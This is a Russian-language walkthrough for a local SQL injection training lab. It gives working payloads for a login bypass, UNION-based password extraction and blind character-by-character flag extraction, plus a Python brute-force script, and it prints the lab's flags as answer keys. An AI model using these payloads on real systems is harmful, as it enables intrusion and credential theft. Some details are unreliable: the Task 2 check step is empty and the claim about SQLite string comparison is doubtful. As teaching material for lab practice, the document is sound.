# Пошаговое руководство: SQL-инъекции

## Задание 1: Обход аутентификации

### Шаг 1: Изучаем нормальное поведение

1. Откройте http://sqli.vulnforge.local/login.php
2. Введите правильные данные:
   - Username: `admin`
   - Password: `SuperSecretPass123!`
3. Нажмите "Войти"
4. Посмотрите на отладочный запрос внизу страницы

**Вы увидите:**
```sql
SELECT * FROM users WHERE username='admin' AND password='SuperSecretPass123!'
```

**Что мы узнали:**
- Приложение использует SQL-запрос для проверки пользователя
- Наши данные вставляются в запрос напрямую, без фильтрации
- Запрос требует совпадения И имени, И пароля одновременно

### Шаг 2: Провоцируем ошибку

1. Введите в поле имени: `admin'` (с кавычкой на конце)
2. В поле пароля: что угодно
3. Нажмите "Войти"

**Вы увидите ошибку базы данных:**
```
Ошибка SQL: unrecognized token: "'"
```

**Почему это произошло?**

Запрос стал таким:
```sql
SELECT * FROM users WHERE username='admin'' AND password='...'
```

Одинарная кавычка `'` — это специальный символ в SQL. Когда мы добавили лишнюю кавычку, структура запроса сломалась:
- Открывающая кавычка: `'admin`
- Закрывающая кавычка: `'` 
- Ещё одна кавычка: `'` — синтаксическая ошибка!

**Ключевой вывод:** Приложение вставляет наш ввод в SQL-запрос как есть, без экранирования. Мы можем влиять на структуру запроса.

### Шаг 3: Обходим аутентификацию

1. В поле имени введите: `admin' OR '1'='1' --`
2. Пароль: любой (например, `x`)
3. Нажмите "Войти"

**Запрос стал:**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='x'
```

**Разбор запроса по частям:**
- `username='admin'` — ищем пользователя admin
- `OR '1'='1'` — ИЛИ условие, которое всегда истинно (строка '1' всегда равна строке '1')
- `--` — это комментарий в SQL. Всё, что после `--`, игнорируется базой данных!
- `' AND password='x'` — эта часть закомментирована и не выполняется

**Результат:** Запрос находит пользователя admin, полностью игнорируя проверку пароля.

### Шаг 4: Получаем флаг

После успешного входа нажмите "Показать флаг" в зелёном блоке.

Флаг: `FLAG{SQL1_1nj3ct10n_M4st3r}`

**Проверка через CLI:**
```bash
./vulnforge task check 1 "FLAG{SQL1_1nj3ct10n_M4st3r}"
```

## Задание 2: Извлечение данных через UNION

### Шаг 1: Изучаем поиск

1. Откройте http://sqli.vulnforge.local/index.php
2. Введите поиск: `admin`
3. Посмотрите на запрос и результат

**Запрос:**
```sql
SELECT username, email, role FROM users WHERE username LIKE '%admin%'
```

Запрос возвращает три колонки: `username`, `email`, `role`.

### Шаг 2: Понимаем UNION

UNION в SQL объединяет результаты двух запросов в одну таблицу.

**Важное правило:** чтобы UNION сработал, количество колонок в обоих запросах должно совпадать.

Мы знаем, что первый запрос возвращает 3 колонки. Значит, наш UNION-запрос тоже должен возвращать 3 колонки.

### Шаг 3: Пробуем UNION (неправильный подход)

Сначала попробуем классический пейлоад:
```
' UNION SELECT password, email, role FROM users WHERE '1'='1
```

**Запрос стал:**
```sql
SELECT username, email, role FROM users WHERE username LIKE '%' UNION SELECT password, email, role FROM users WHERE '1'='1%'
```

**Проблема:** `LIKE '%%'` находит всех пользователей, и они смешиваются с UNION-результатами. Мы видим имена вместо паролей.

### Шаг 4: Правильный UNION (SQLite)

В SQLite нужно использовать числовое сравнение и искать то, чего нет в базе:

```
Z' UNION SELECT password, email, role FROM users WHERE 1=1--
```

**Запрос стал:**
```sql
SELECT username, email, role FROM users WHERE username LIKE '%Z' UNION SELECT password, email, role FROM users WHERE 1=1--%'
```

**Что изменилось:**
- `Z` — такого пользователя нет, первая часть запроса возвращает 0 строк
- `1=1` — числовое сравнение, которое работает в SQLite (в отличие от `'1'='1'`)
- `--` — комментирует остаток `%'`

**Результат:** в колонке "Пользователь" отображаются пароли:

| Пользователь | Email | Роль |
|-------------|-------|------|
| SuperSecretPass123! | admin@vulnforge.local | admin |
| password123 | john@example.com | user |
| qwerty | jane@example.com | user |

### Шаг 5: Проверяем через CLI

```bash

```

## Задание 3: Слепая SQL-инъекция

### Шаг 1: Понимаем концепцию

Слепая (Blind) инъекция используется, когда приложение:
- Не показывает ошибки
- Не выводит данные напрямую
- Но меняет поведение в зависимости от истинности условия

Мы можем только наблюдать разницу: "пользователь найден" vs "пользователь не найден".

Откройте http://sqli.vulnforge.local/profile.php?id=1

### Шаг 2: Проверяем разницу ответов

Сравните два запроса:

**Истинное условие (TRUE):**
```
?id=1 AND 1=1
```
Результат: пользователь отображается (условие истинно)

**Ложное условие (FALSE):**
```
?id=1 AND 1=2
```
Результат: "Пользователь не найден" (условие ложно)

Разница в ответах позволяет получать информацию по одному биту (да/нет) за запрос.

### Шаг 3: Узнаём структуру таблицы

Проверим, есть ли колонка `secret_flag`:
```
?id=1 AND (SELECT COUNT(secret_flag) FROM users) > 0
```
Если пользователь отображается — колонка существует.

### Шаг 4: Извлекаем флаг посимвольно

Флаг хранится в колонке `secret_flag` таблицы `users`. Используем функцию `SUBSTR()` для проверки отдельных символов:

**Проверяем первый символ:**
```
?id=1 AND SUBSTR((SELECT secret_flag FROM users WHERE id=1),1,1)='F'
```
Если пользователь отображается — первый символ флага 'F'.

**Проверяем второй символ:**
```
?id=1 AND SUBSTR((SELECT secret_flag FROM users WHERE id=1),2,1)='L'
```
Если отображается — второй символ 'L'.

**Проверяем третий символ:**
```
?id=1 AND SUBSTR((SELECT secret_flag FROM users WHERE id=1),3,1)='A'
```
И так далее...

### Шаг 5: Собираем флаг полностью

Продолжая перебор, получим:
```
F L A G { S Q L 1 _ 1 n j 3 c t 1 0 n _ M 4 s t 3 r }
```

**Полный флаг:** `FLAG{SQL1_1nj3ct10n_M4st3r}`

### Шаг 6: Автоматизация (Python)

Ручной перебор утомителен. Напишем простой скрипт:

```python
import requests

url = "http://sqli.vulnforge.local/profile.php"
flag = ""
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"

for pos in range(1, 50):
    found = False
    for char in chars:
        payload = f"?id=1 AND SUBSTR((SELECT secret_flag FROM users WHERE id=1),{pos},1)='{char}'"
        r = requests.get(url + payload)
        if "Пользователь не найден" not in r.text:
            flag += char
            print(f"Позиция {pos}: {char} -> Флаг: {flag}")
            found = True
            break
    if not found:
        break

print(f"\nФлаг: {flag}")
```
